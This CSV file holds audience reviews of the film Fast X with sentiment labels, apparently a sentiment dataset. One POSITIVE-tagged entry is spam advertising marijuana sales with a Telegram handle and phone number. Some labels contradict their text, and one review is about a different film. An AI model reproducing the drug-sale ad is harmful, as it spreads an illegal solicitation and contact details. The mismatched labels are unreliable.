Date,Score,Reviews
"May 28, 2023",POSITIVE,Action packed and entertaining from beginning to end! This was probably my favorite in the series.
"May 28, 2023",NEGATIVE,The character interactions were solid. We all expect to suspend disbelief in exchange for great action shots and easy laughs. Momoa ruins that whole equation. He is gratting and irritating. I actually left the theater annoyed at his character. This is easily the worst fast and furious as there is no campy plot without a good villain. Momoa not only spoiled a summer action flick but ruined my evening leaving me to rant online. This movie is bad enough to make me rethink my opinion of an actor I initially liked a lot in previous rolls.
"May 28, 2023",POSITIVE,"Good action, special effects, and character likeability."
"May 28, 2023",POSITIVE,"Loved it all, surprised on no ending"
"May 28, 2023",POSITIVE,It was good. Liked bringing in all the characters.  Jason Momoa should have been a little bit more serious not a clown for the evil side of the story.
"May 28, 2023",POSITIVE,Better storyline with action packed scenes.
"May 28, 2023",POSITIVE,Best Fast and Furious sequel yet! Jason Mamoa’s character as the “bad guy” was a hit!
"May 28, 2023",NEGATIVE,Atuações sofríveis e desenvolvimento do filme extremamente previsível
"May 28, 2023",NEUTRAL,Nothing makes me more excited like unexpected sh*t and this movie is full of it. But it also has a lot of the same sh*t
"May 28, 2023",POSITIVE,So good never disappoints
"May 28, 2023",POSITIVE,"Another aviation’s packed Fast and Furious film! Lots of car chases, explosions and gun fire. Momoa did a great job playing somewhat of a mean/goofy character. And your can’t go wrong with this trifecta…Vin Diesel, Momoa and Cena!"
"May 28, 2023",POSITIVE,Great action scenes!!
"May 28, 2023",POSITIVE,Loved the whole movie!
"May 28, 2023",POSITIVE,I love all the stars in the movie. Storyline got me a couple of times.
"May 28, 2023",POSITIVE,"Seeing Paul walker was the best, and how he went after his son and by the ending Ik it will be another one"
"May 28, 2023",POSITIVE,Full of action from start to finish!
"May 28, 2023",POSITIVE,I do not want to say too much about Jason Momoa's character but there was a quality that does not quite fit his size.  He was joker versus comic
"May 28, 2023",POSITIVE,Great movie. Cant wait for the final chapter.
"May 28, 2023",NEGATIVE,Thanks for wasting two hours for nothing.
"May 28, 2023",POSITIVE,"It had a good story, even though Jason Momoa had a Johnny Depp syndrome. I'll be looking forward to the next chapter."
"May 28, 2023",NEGATIVE,"Grew up with Vin and his familia, and seen all his movies, my wife forces me, but this one, que paquete!! The helicopter scene, rear wheels where off the ground and yet, he wins.  Then the kid jumps cars, unbelievable, but the biggest wopper is the dam scene, ridding down the wall...unbelieavable...almost crap.  These movies were exciting cause they were almost believable, not anymore.  Also, Mamoa didnt do a good job, he seemed to have copied the joker that keith ledger did, not original at all. Even with all of this, it was still nice to see the team and the father son scenes, also dont like Scena, but loved the 90s music."
"May 28, 2023",POSITIVE,"Movie is entertaining, heart stopping an keeps you on the edge of your seat. It's a must see"
"May 28, 2023",POSITIVE,"W🤯W! Needed to watch FAST X wearing seat belts! Storyline rocks from LA to  London, Brazil, Portugal with a HUGE cast. Saw it in ScreenX across 3 screens. Loved it!"
"May 28, 2023",POSITIVE,"It is all that I expected. It's fun, exciting, sad and keeps you on your toes for more"
"May 28, 2023",NEGATIVE,"Jason Mamoa's character was horribly played and way over the top, as were the car explosions and general 'action sequences'."
"May 28, 2023",POSITIVE,Omg what’s not to like it was freakin awesome I can’t believe the rock is gonna be in the next part
"May 28, 2023",NEGATIVE,Worst  movie  come from franchise
"May 28, 2023",POSITIVE,"Great plot to get a return for the next move, great ending cliffhanger"
"May 28, 2023",POSITIVE,Loved the movie. What a cliffhanger at the end.
"May 28, 2023",NEUTRAL,Didn’t love Jason Momoa as the villain. But the action was good.
"May 28, 2023",POSITIVE,It was great the action was awesome but the story and cgi could have been better.
"May 28, 2023",POSITIVE,Liked that is was serious but had funny parts as well
"May 28, 2023",POSITIVE,One of the best in the series!
"May 28, 2023",POSITIVE,action   action     action
"May 28, 2023",POSITIVE,I loved it!!! Can’t wait for second part!
"May 28, 2023",POSITIVE,Fast X was dope damn I can't wait til the next one comes in 2024-2025 I love Jason Mamoa as  Dante he's hilarious 🤣😆 wow I recommend u watch this movie 2x or more my gson loved it..
"May 28, 2023",NEGATIVE,"The exposition made no sense for most of the movie, was pretty nonsensical does anybody actually die in this franchise doesn't seem like it, this is definitely the worst in the series, I was a fan but the Family cringe was mentioned more than any actual racing, movie should of been called FAMILY,"
"May 28, 2023",POSITIVE,Awesome movie! Lots of action bombing and very touching moments.
"May 28, 2023",POSITIVE,The movie was full of action and overall a great watch.
"May 28, 2023",POSITIVE,Lot's of action! No boring plots! It was AWESOME!!!!
"May 28, 2023",POSITIVE,the movie was good just felt kinda like the acting was kinda bad action seens was good jason momoa definitely was good though felt he carried the movie through it all
"May 28, 2023",POSITIVE,Excellent! Action packed!
"May 28, 2023",POSITIVE,It's a Fast and Furious movie. It delivers on all accounts. Jason Momoa is so good in it too!
"May 28, 2023",NEUTRAL,Jason Momoa as the villain doesnt work
"May 28, 2023",POSITIVE,The stunts were incredible! The all star cast and diversity made the movie appealing to me.
"May 28, 2023",NEGATIVE,"I buckled up for the latest instalment in the adrenaline-fueled franchise, Fast X. Having previously enjoyed the well-made escapist nonsense of this franchise, I eagerly anticipated this action-packed joyride. But the reality falls short of the high-octane thrills and heart-racing moments we've enjoyed during this long-running, beloved series. Directed by a new visionary, Fast X struggles to find its footing, leaving me with a disjointed and lacklustre experience.

Though intended to be the cornerstone of the film, the plot feels convoluted and overstuffed. The narrative attempts to tie up loose ends from previous entries, resulting in a tangled web of unresolved storylines and contrived twists. The themes of loyalty, family, and redemption, which once resonated deeply, are now lost amidst the chaos of overblown action sequences and cheesy dialogue.

Unfortunately, the once-charismatic characters we've grown to love seem to be mere shadows of their former selves. The lacklustre performances by the ensemble cast dampen the film's impact, leaving me yearning for the chemistry and charisma that once made this franchise shine. The newcomers fail to make a lasting impression, and their interactions feel forced, lacking the organic camaraderie we expect from a Fast and Furious film.

While attempting to inject fresh energy into the series, the direction falters in execution. The pacing is erratic, with frenetic action scenes abruptly juxtaposed with moments of forced sentimentality. The director's attempts to reinvent the franchise fall flat, resulting in a disjointed and unsatisfying experience.

The score, cinematography, and production design, once standout elements of the Fast and Furious films, fail to leave a lasting impact. The familiar pulsating beats and slick visuals that defined the series are noticeably absent, replaced by generic choices that fail to elevate the overall experience. The special effects, too, lack the finesse and attention to detail we've come to expect, leaving action scenes feeling artificial and detached.

The editing further exacerbates the film's issues with jarring cuts and questionable transitions. Scenes that should have heightened the tension instead fall flat, as the editing fails to maintain a cohesive flow. The dialogue, filled with clichés and uninspired one-liners, adds little depth to the already weak characterisations, leaving me longing for the witty banter and memorable lines that once made these films a guilty pleasure.

While Fast X attempts to recapture the essence of what made this franchise a global phenomenon, it falls short in almost every aspect. As a viewer, I felt a palpable sense of disappointment, longing for the days when these films delivered heart-pounding action and captivating storytelling. It pains me to say that Fast X fails to leave a lasting impact, leaving me questioning the franchise's future.

Fast X is a lacklustre entry in the series, struggling to find its place amidst a convoluted plot, underwhelming performances, and a misguided attempt at reinvention. Despite its best intentions, the film fails to deliver the thrills and emotional resonance that made its predecessors successful. Fast X is a forgettable and disjointed experience that falls far behind the high standards set by the franchise—strap in for a disappointing ride."
"May 28, 2023",POSITIVE,Only because the way the ended it off!! But it was a good movie!!
"May 28, 2023",POSITIVE,lots of action vin dissel was great
"May 28, 2023",NEUTRAL,"Exactly what you would expect.  If you want brainless action, 10/10.  The story line is weak, the dialogue is weak.  Definitely passes the time."
"May 28, 2023",POSITIVE,The ending just left me hanging. 🫣👀👀👀
"May 28, 2023",POSITIVE,Just Great Dumb Fun. Mamoa was an excellent Camp villian. In the Universe rules of Dom Torretto only being invulnerable when in contact with a car applied here
"May 28, 2023",POSITIVE,This movie is amazing
"May 28, 2023",NEGATIVE,Ugh. Another terrible time with terrible actors.
"May 28, 2023",NEUTRAL,"senseless fight scenes. senseless deaths. unanswered plot lines.
not the best. thought this was the last movie. now need to have one more to tie up some loose ends."
"May 28, 2023",POSITIVE,"Honestly, it was a solid FF movie, took it back to the roots in some ways, and tried some new formula as well. That being said, Jason Mamoa had Entirely too much fun in that part and it was Absolutely fabulous. hahaha"
"May 28, 2023",NEGATIVE,"Fast X's most interesting component is its name. The series simply doesn't have the hook that series such as Marvel, DC, or even Transformers have to continue to keep people wanting to come back and is only able to keep a small amount of fans to keep spending money to see a bland and underwhelming film about people using the steering wheel I'm different ways."
"May 28, 2023",NEUTRAL,Too much action not enough racing
"May 28, 2023",POSITIVE,Outrageous fun and ridiculous in all the best ways!
"May 28, 2023",POSITIVE,There was plenty of action and the special effects were off the chain
"May 28, 2023",POSITIVE,Loved it! Can’t wait for the sequel.
"May 27, 2023",POSITIVE,It was a super good movie a lot of action
"May 27, 2023",NEGATIVE,Poor blend of CGI and dragging the storyline too much.
"May 27, 2023",POSITIVE,Jason Momoa take has the big bad was straight bonkers. makes the movie a most watch. too much cgi but stunts was a little wild so understand
"May 27, 2023",POSITIVE,The movie was great with a lot of action and shows how important family is.
"May 27, 2023",POSITIVE,Great movie. Can’t wait to see what they do next
"May 27, 2023",NEUTRAL,"Meh. After so many of the Fast and Furious movies I think I’ve become immune to the action.  Yah, the chase scenes are great but I used to be on the edge of my seat, watching them.  I’d wait for it to come out on streaming."
"May 27, 2023",NEGATIVE,Fast Furious movies in the past were better.
"May 27, 2023",POSITIVE,I really love this movie
"May 27, 2023",POSITIVE,"Movie was extremely entertaining, fun and well made. It was a fun movie to watch"
"May 27, 2023",POSITIVE,"Best movie ever people need to see how good this movie is, GOOD COMEDY AND GOOD ACTING AND GOOF ACTION"
"May 27, 2023",POSITIVE,Entertaining movie. Definitely better than the previous one and a unique installment.
"May 27, 2023",NEGATIVE,"Projector stopped working, movie was cancelled."
"May 27, 2023",POSITIVE,I loved it. only weird thing i noticed. After the fight seen on the bridge... car pieces everywhere..... how did the black camaro remain undamaged or dust free 🤔
"May 27, 2023",POSITIVE,"Pretty good, can’t wait to see the next one"
"May 27, 2023",NEGATIVE,"I am a huge fan of cars and this series. Highly disappointed. Movie was slow and the wrestlers on the show made it corny. I didn't understand the random scenes for the laugh, it was definitely odd because it's usually a clever sense of humor insert-this time was like watching the Hang Over. Still appreciate the cars and definitely need to bring back the Rock. This was worst than Tokyo Drift. Would recommend this to someone trying to kill time."
"May 27, 2023",POSITIVE,"Very action packed , great story and keeps you on the edge of your seat!! But the ending was terrible!!"
"May 27, 2023",NEUTRAL,Me apareció bueno 🫱🏾
"May 27, 2023",NEGATIVE,"Read some other reviews after my initial take. Good action, but the villain, Mommas character made the absurd just plain stupid. No reason for a goofball villain in a Fast movie. Yuck!"
"May 27, 2023",POSITIVE,It was amazing  I love it I waited for a year and a half to see this movie
"May 27, 2023",NEGATIVE,Same movie as the last 5
"May 27, 2023",NEGATIVE,"It’s a fast and furious movie, it’s just as over the top and ridiculous as you’d expect at this point. But surprisingly Jason Mamoa played a good “bad guy” in the movie and made it more enjoyable."
"May 27, 2023",NEGATIVE,The first half is amazing! Extremely entertaining. Once it's gets to a point where it ridiculously disobeys the laws of physics it starts to get unbearable and dumb. These are people are the end of the day.. not superheroes.
"May 27, 2023",POSITIVE,Action packed from beginning to the end. Can’t wait for the next one.
"May 27, 2023",NEGATIVE,"For me the franchise peaked with Fast 5 but I still enjoyed the 6th & 7th movies.  It's been all downhill from there.  The script for Fast X was very poorly written, the only jokes that landed were by Dante's character.  Jason Momoa was outstanding and gave his all to this movie. Tyrese Gibson on the other hand had some of the worst lines I have ever heard in a movie.  They were so bad that it made me feel uncomfortable and sorry for him. The moment Cipher showed up in the movie and acted like their ally the movie lost me.  She was one of the best (if not the best) villain during the entire franchise. The way they wrote Fast X I have this horrible feeling that she will be at the BBQ at Dom's house at the end of the final movie eating burgers and being part of the gang."
"May 27, 2023",NEGATIVE,Worst of the series and a complete waste of money.
"May 27, 2023",POSITIVE,Mamoa stole the movie!! I loved it!!
"May 27, 2023",POSITIVE,"A fun movie experience! Dont take it too seriously and its a great time. Mindless action, unbelievable action sequences and more of the same—but more grounded in reality than Fast 9. In a good way."
"May 27, 2023",NEUTRAL,"Didn't like or dislike it.  But if you wanna watch Jsson Momoa try to be The Joker and the usual impossible physics,  then this movie is absolutely for you. Alex"
"May 27, 2023",POSITIVE,Totally Awesome!!!!!
"May 27, 2023",POSITIVE,Fast paced couldnt leave my seat. Only thing I didnt like is have to wait for fast eleven to see what Ihappened
"May 27, 2023",POSITIVE,"This is different from all the other parts of this franchise. This is a must watch and Jason Momoa is beyond expectations, you can compare him with some real villains ever in bollywood. This is a Must Watch. With surprising ending."
"May 27, 2023",NEUTRAL,"When Jason Momoa's Dante isn't on screen, the movie works, but once Momoa's excessively over-the-top villain takes the center stage, does the movie it's time to hit the brakes. Everything else feels like a ""F&F"" movie when he's not around, but when he and some of the unnecessary humor, Brie Larson's wooden acting and outrageous stunts come in, the movie risks driving into a wall of stupidity at full force."
"May 27, 2023",POSITIVE,"loved , amazing , sad and funny.
AMAZING"
"May 27, 2023",POSITIVE,"Not as much action as the others, but still very entertaining!"
"May 27, 2023",POSITIVE,I always think these movies are entertaining! Would recommend watching. The ending definitely shows there is going to be another movie made!
"May 27, 2023",POSITIVE,its was the best one ever
"May 27, 2023",POSITIVE,"LOL!!! it was so Fast & so Furious! Jason Momoa is by far the best villain they have had so far.  He is SO embracing being  Dante, crazy and flamboyant. Definitely a cliffhanger, so stap in for the ride and anxiously await Fast 11!"
"May 27, 2023",POSITIVE,This movie was full of action I love seeing cars racing and jumping off through cliffs
"May 27, 2023",POSITIVE,I like the driving and explosive
"May 27, 2023",NEUTRAL,"After how bad the previous installment was, I must say that this new sequel revived what the fast and furious franchise is, the action is the best, like its imposing villain, on the other hand, it has the same problems of the other movies and that is the incoherence of its plot, besides that it makes no sense, and although it is not the best in the saga, it is one that you enjoy a lot."
"May 27, 2023",POSITIVE,Great story awesome action
"May 27, 2023",NEGATIVE,Omg this movie was dumb! It made no sense and defied physics!
"May 27, 2023",POSITIVE,"I don't know why people hate on these movies so much. They don't pretend to be anything that they aren't. What they are is good fun. I love the explosions and the muscles and the fun chases. I love the friendships and callbacks. I even love the outlandishness. The cast is ever-expanding and I love all the new characters. Shout out to Thad Castle, missed having a scream."
"May 27, 2023",NEUTRAL,It's a 100 million dollar telenovela with a plethora of well produced action scenes.
"May 27, 2023",NEUTRAL,"Unrealistic but entertaining. Aquaman is the best part of it, but Vin Diesel sucks at acting and needs to stick with what made the movie series great: racing and action 
Overall"
"May 27, 2023",POSITIVE,"Everything!! The script, the action and the story line!! Wonderfully thought out!!!"
"May 27, 2023",NEGATIVE,Horrible! What a waste of time and money.
"May 27, 2023",POSITIVE,Disliked the movies do not like cliffhangers especially when now we the movie goers have to wait so long while for  a so called 11th chapter of a saga continuos never ending.
"May 27, 2023",POSITIVE,"Movie was great I have watched almost every movie he has made,"
"May 27, 2023",POSITIVE,"Suspense, keep you guessing. Love it & can't wait for the next one."
"May 27, 2023",POSITIVE,"It had a lot of action, a lot of the dialogue, some comedy than just a good storyline I really enjoyed it. I plan to go back and see it again."
"May 27, 2023",POSITIVE,"The movie is great. Once you start ignoring the logic’s and the physics you’ll be able to have fun although I was aware that this is going to be part one of the ending, I will still left, mesmerized by the ending. It is nice to see that a lot of the iconic characters are still alive and some are returning. It is not one of my favorites but it’s definitely the top five."
"May 27, 2023",POSITIVE,Have watched from the very first one. Hate when gotta wait for the next one. Going to hate that we are at the end of the saga.
"May 27, 2023",NEGATIVE,If you liked Fast Five you will enjoy the half hour recap lol. I had Fun drinking corona but the movie was pretty bad but still glad I saw it.
"May 27, 2023",POSITIVE,To long for no good reason.  Action scenes were good
"May 27, 2023",POSITIVE,Es buena 👍 y me gusto mucho la película 🎥 😌 pero estaba un poco aburrida 😒 pero era emocionante y quiero ver la onceava entrega!!!!
"May 27, 2023",POSITIVE,Was not a fan of how this movie ended. But other than that I enjoyed it
"May 27, 2023",POSITIVE,Waiting on the next one!!!
"May 27, 2023",POSITIVE,Meh ! Typical cliche phrases and totally unrealistic stunts. Let's be honest …. That's the reason we watch this franchise but that's why I watched this movie like the previous 9. Just enjoy a decent movie
"May 27, 2023",NEUTRAL,This movie was ok. It seems like there will be a part 2. I am not a big fan of cliffhangers.
"May 27, 2023",POSITIVE,"Nonstop action, great story!"
"May 27, 2023",POSITIVE,"Both Jo and I LOVED the 2023 ""Little Mermaid"".  We have a message for all those negative (mainly pro reviewers plus the ones that hate anything nice) the auditorium at the cinema where we watched it lat Friday (26) was FULL. Over 50% of the persons there were children. They were ALL watching it intently for OVER TWO HOURS!! They yelled and clapped it when it had finished. Jo (who is 88) stood and clapped it too.  

If you give a movie like this a ONE or slam it you need another job as a pro reviewer. The rest of you shouldn't bother to go to the cinema at all. I know we all have different ideas on entertainment. If you are entertained by blood, gore, violence, foul language, etc. what on earth were you doing at The Little Mermaid? Hallo - you are NOT going to find it a Walt Disney"" Little Mermaid"". 

Parents, take your children, and if you are like us, elderly you will find it a refreshing change from the Action Super Hero movies that is being sent out ad nausea..  And yes, Jo and I watch them, too."
"May 27, 2023",POSITIVE,"This movie was amazing, it had good scenes and funny scenes as well."
"May 27, 2023",POSITIVE,Good action movie. The end leaves you wondering about the future.
"May 27, 2023",NEGATIVE,"muy mala sin argumento, pasajes de escenas sin sentido, dialogos malos, pelicula que pense en irme de la sala. Jason Momoa salva la pelicula, es la suma de todo lo malo de las anteriores en una sola peli"
"May 27, 2023",NEGATIVE,If the public had good taste in movies there wouldn’t be ten of these movies. Can we also stop pretending Vin Diesel is a good actor?
"May 27, 2023",POSITIVE,"God tier, vin knows what we want."
"May 27, 2023",NEUTRAL,"We went because we always go see them no matter how wildly impossible the things they do are going to be. We know what to expect going into the movie. But this one might take the cake! 😂 Non-stop ridiculous, but if you’re a Fast Fan, it’s nothing other than what you’d expect it to be 🙂"
"May 27, 2023",POSITIVE,Action from start to finish. A few surprises along the way.
"May 27, 2023",POSITIVE,"I like not stop action 
Racing 
Fight
Brothers disagreement 
People thought he sounds and act dumb and scare of height
But he's the only one that had cash on him while everyone else had lost their wealth on the internet 
Van Diesel got hus son back
How John Cena did what he can to get his nephew back .
I like the two women fought in the Lab because of their past history. 
Even my wife was impressed. 
Having famous actors workibg together makes things fun and adventurous. It's truly amazing."
"May 27, 2023",NEGATIVE,"As a fan of this series, I felt I wasted my time seeing this movie. Jason's character was too over the top. The movie has a  cliffhanger ending even though it was advertised this was the last movie in the series. I liked the action scenes even though they were over the top also."
"May 27, 2023",POSITIVE,I thought it was great! Love the characters and it was exciting to watch. One of the best movies I've seen in a long time. I don't go to watch movies that are documentaries so who cares if it's not realistic? The point is to entertain and it was great! Can't wait for the next one!
"May 27, 2023",NEGATIVE,"Poor visual effects, theres no a great history. The same of all time"
"May 27, 2023",POSITIVE,"It was a very good movie and I took my husband to go see the movie it thrilling, amazing also top of the movie."
"May 27, 2023",POSITIVE,"This installment does not disappoint with adrenaline fueled, heart pounding scene after scene. It knows what it is and excels at being a classic popcorn flick!  You will not be disappointed!"
"May 27, 2023",NEUTRAL,"The movie is part 1 of either 2 or 3 (not sure if they have decided yet). 
The good… Jason Momoa is the best villain I have seen in any movie in a long time. Quite clearly took inspiration from the joker but unlike most jokers you do feel he would be able to beat Batman in brawn as well as brains.
The bad is the movie tries to be old fast and furious and new fast and furious I.e very cheesy lines ""family"" the nos blue flames are also back in full force.
Some cgi is also very poor, the car chase through Rome in particular as dons car is going down the steps the car really looks to clean like a computer game.

I will be going to see the next installment if only for my need for closure. But if you haven't seen it I would wait for it to be on sky."
"May 27, 2023",NEUTRAL,"Not again...........
Not even death stops the need for money."
"May 27, 2023",POSITIVE,"É inegavelmente melhor do que F9, e por mais que ainda mantenham alguns absurdos, decidiram não ir no espaço dessa vez, mantiveram o pé (levemente) no chão… Não dei 5 estrelas, porque ainda tem os mesmos problemas de narrativa e roteiro que F9!"
"May 27, 2023",POSITIVE,"In a world where everyone comes back from the dead, physics doesnt exist and cars are invincible. I'm just here for the crazy at this point and I love it!"
"May 27, 2023",POSITIVE,"The dumbest franchise continues with a wildly entertaining, cool and fun beginning of the end of the road. Momoa is a standout!"
"May 27, 2023",POSITIVE,"Wowww! The best director, gosh, what plane scenes!!! You really had me! Jason Momoa makes a great appearance, it hurts though to see him in a negative role. Please cast Bryce Langston in Aquaman instead or beside him!"
"May 27, 2023",POSITIVE,"Great Movie, can't wait to see the next."
"May 27, 2023",POSITIVE,"Lover that it will be a follow up, hopefully in the near future."
"May 27, 2023",POSITIVE,Better than the last 2 for sure. Aquaman is fantastic as the main villain.
"May 27, 2023",POSITIVE,This movie didn't deserve hate
"May 27, 2023",POSITIVE,The character that played villain and Jason Stratham!
"May 27, 2023",POSITIVE,"Loved loved loved the movie! They made sure to include Paul Walker in a scene.... True fans miss him so much. Jason Mamoa was brilliant. I liked seeing him as a villain, duck a great addition to the F&F franchise. Charlize Theron is a winner and the chemistry between her and Letty was awesome."
"May 27, 2023",POSITIVE,Love it.   Cant wait for the last one
"May 27, 2023",NEUTRAL,"It was ok, started off slow. The new actirs that were introduced were subpar"
"May 27, 2023",POSITIVE,Awesome!! Can't wait for the the next one. You'll love the cliffhanger.
"May 27, 2023",POSITIVE,"Totally, AMAZING!! Couldn't stay still in my seat adventure. The family values, morals and of course the love most definitely felt"
"May 27, 2023",POSITIVE,Over the top Action-Packed as expected and always about Family!
"May 27, 2023",NEGATIVE,"This isn't stupid fun like the other ones 
This one is jest stupid stupidity.  There are no stakes, and the main rival is a giant ball."
"May 27, 2023",NEGATIVE,"If Paul Walker is watching from above he'd be ashamed at what this increasingly ludicrous franchise has become. I spent the whole movie just wanting it to end, it was simply insulting, and the whole cinema was bagging it on the way out, young and old alike. Says a lot when even young kids laugh at how bad a modern CGI movie is. As a major F&F fan, it's been hard to watch the gradual demise with increasing levels of fiction ( super magnets anyone? ) but Fast X goes into the stratosphere of bad. I went in with low expectations, and need to revise how low I start out after that travesty."
"May 27, 2023",NEGATIVE,"Honestly, this is the worst addition to the series yet. It delivers on high octane thrills as all its predecessors but a little sub par in comparison, it's in the rest of the story that this movie falls flat. Now I know we don't watch fast and furious for the plot but normally there's some semblance of plot and sense, this one however is a complete and utter mess and gives the feeling of being poorly stitched together, the crew is never fully assembled together and working out a plan, in fact most of the movie the majority of the crew is literally doing nothing. Letty is in her own little side story and really doesn't achieve anything that moves the plot along, and same goes for the main crew who pull off a heist gone wrong then wander around trying to get back on their feet to immediately ""apparently"" be blown to bits in a plane… none of the plot makes sense and is actively hard to follow, on top of this there are a lot of questionable choices by the characters that again don't really make sense. It's a shame being back Justin Lin he made the series way better in terms of story, comedy, drama, emotion and even high octane thrills but most importantly there is a feeling of Family that this movie misses."
"May 27, 2023",POSITIVE,"Brilliant in all aspects. Acting, special effects and sound tracks as well"
"May 27, 2023",POSITIVE,"I am the main provider of marijuana strains and all other products. I am the best plug and I bet your search for a reliable plug and socket supplier has come to an end. Where is it located and how much do you want? We sell at different prices but we negotiate according to the minimum order and the client's recommendation.
how to reach us 
telegram.....Meyer420
whatsapp/text or call+18622315278
For an immediate response."
"May 27, 2023",POSITIVE,"I Like The Whole Movie,how it went off there will be another Part to it Also"
"May 27, 2023",NEUTRAL,"It was a great experience watching this movie in terms of action and thriller, and also the appearance of new characters based on past movies stories. However, what surprised me a lot is the end of the movie, it was unexpected and had left some uncompleted scenes, unlike the past parts of F&F, the end is open to plenty of events to come, and a lot of characters we thought dead to show up again."
"May 27, 2023",POSITIVE,No dislikes at all. Every F&F movie gets better and better with every movie and this one doesnt disappoint me at all. Cant wait for the next one installment. Highly recommended.
"May 27, 2023",NEGATIVE,Clear that Momoa was trying to style his character off Heath Ledger's Joker but IMO failed in all but one scene. Story was more cliched and ridiculous than previous movies (all of which I enjoyed). Bottom of the pile for me.
"May 27, 2023",NEGATIVE,"A non sense of action scenes, bad acting, etc."
"May 27, 2023",POSITIVE,"Fast and Furious in good form.  They have so many characters now that it's hard to keep everybody satisfied, but it's a good summer movie.  Just turn off your brain and enjoy the over-the-top action.  STAY FOR THE END CREDITS."
"May 27, 2023",POSITIVE,The movie was more than I was expecting
"May 27, 2023",NEGATIVE,Time to wrap the series. These movies are beyond ridiculous
"May 27, 2023",NEGATIVE,Waste of time and money
"May 27, 2023",NEGATIVE,"This movie was only done to generate revenue and squeeze every little cent out of it. Story, logic, acting, nothing matters. It should only look cool in a trailer so people would watch it. Embarissing for participating actors, too I believe."
"May 27, 2023",NEGATIVE,Jason mamoa saved the movie
"May 27, 2023",NEGATIVE,"Bad CGI, terrible acting, dialogue was horrific. Not even going to mention the stunts, it's ridiculous again! Jason Momoa's character is the only good thing in this movie, a good ""joker-esque"" villain. However, this franchise has lost the plot a long time ago and someone needs to put it out of its misery."
"May 27, 2023",NEGATIVE,"The movie was honestly super predictable, but to be fair, I'm not watching for the plot. The action, as always, was great and fast-paced, but to draw this out for an additional 2 movies seems excessive. 

Overall if you're looking for something with tons of action and don't enjoy Marvel or DC, then this is a good movie to watch. Otherwise, don't waste your time and money."
"May 27, 2023",POSITIVE,"Pretty good movie better then the last few, definitely get a good vibe from it like number 4, 5, 6 and 7. Bad ending tho. SPOILERS!!! Major cliffhanger excited to see the next movie 🍿."
"May 27, 2023",NEGATIVE,Worst ending ever. Too repetitive in their lines. Stop acting like superheroes.
"May 27, 2023",NEGATIVE,"This franchise should’ve ended 4 movies ago. There’s little to no racing at all and the action is so unrealistic and cheesy. At this point, people are just rating these movies high for nostalgia."
"May 27, 2023",NEUTRAL,"Synopsis: Dominic Toretto (Vin Diesel) and his wife Letty (Michelle Rodriguez), are happy to have renounced their dangerous street racing-heist lifestyle for the peace and safety of their family, until a psychotic revenge seeker, Dante Reyes (Jason Momoa) comes knocking.
Review: Roaring fast cars, underworld, cops, and family… The Fast and the Furious franchise for over two decades with minor modifications has pretty much offered us the same content, over the top fast car action, with little to none, emotional heft. Paul Walker's untimely death in 2013, was perhaps the most you felt for the franchise. Over the years, the core team has stayed the same even as newer faces joined the race. Beyond Diesel and his crew, Dwayne Johnson, John Cena, Charlize Theron, Helen Mirren, Brie Larson, Gal Gadot, Scott Eastwood, Jason Statham and now Jason Momoa, the series has resorted to using actors as minor script updates.
Despite a rather chaotic, silly, and overcrowded plot, Jason Momoa has the most fun with his character. He gives his comical-psychotic villain the insanity and anger of a disgruntled employee on a notice period. He just wants to watch the world burn. His jibes and nicknames for characters (John Cena is uncle muscle) entertains and amuses the most. While he is vindictive and ruthless, he doesn't seem as menacing as his Joker-esque alter ego would imagine.
The plot has little relevance but if you must know, it all begins when Toretto's wisecracking friends are sent on a fake mission to Rome. The team is framed for a massive bomb explosion that turns the agency against them. This moment has the film's most ambitious chase sequence. Drug kingpin Dante is the mastermind, and he is hellbent on making Toretto suffer by depriving him of his family.
You will hear the words ‘family' and ‘agency' after every two lines in the 10th instalment. Are ""the days where a man behind the wheel of a car could make a difference are (truly) over?"" Turns out they aren't over as we have another sequel waiting. Director Louis Leterrier offers an orgy of explosions and car chases demanding minimal emotional investment. If you don't mind a cycle of preposterous action sequences loaded with VFX not allowing a moment of calm, Fast X delivers exactly what it promises. Pete Davidson has a fun cameo. You won't blink even for a second. The film offers mindless popcorn entertainment in every scene in abundance.
However, there is not a single novelty factor and watching one film in the series is as good as watching them all. Not that some other successful franchises haven't taken the same route, but F&F series is nearing its end and you want them to take that VRS. 'How did they let this go on for so long,' indeed?"
"May 27, 2023",POSITIVE,Lots of action. Great stunts
"May 27, 2023",POSITIVE,It was an awesome movie!
"May 27, 2023",POSITIVE,I loved Jason Mamoa as a bad guy.  Typical Fast and the Furious movie which I love.
"May 27, 2023",POSITIVE,it was good like all fast and furious
"May 27, 2023",POSITIVE,I liked everything about the movie!!!! There was action in every second of the movie!!
"May 27, 2023",POSITIVE,One of the BEST movies I have seen in a long time. LOVE this series and very pleased with how this turned out! Lots of action and lots of laughs!
"May 27, 2023",NEGATIVE,Please make it stop.
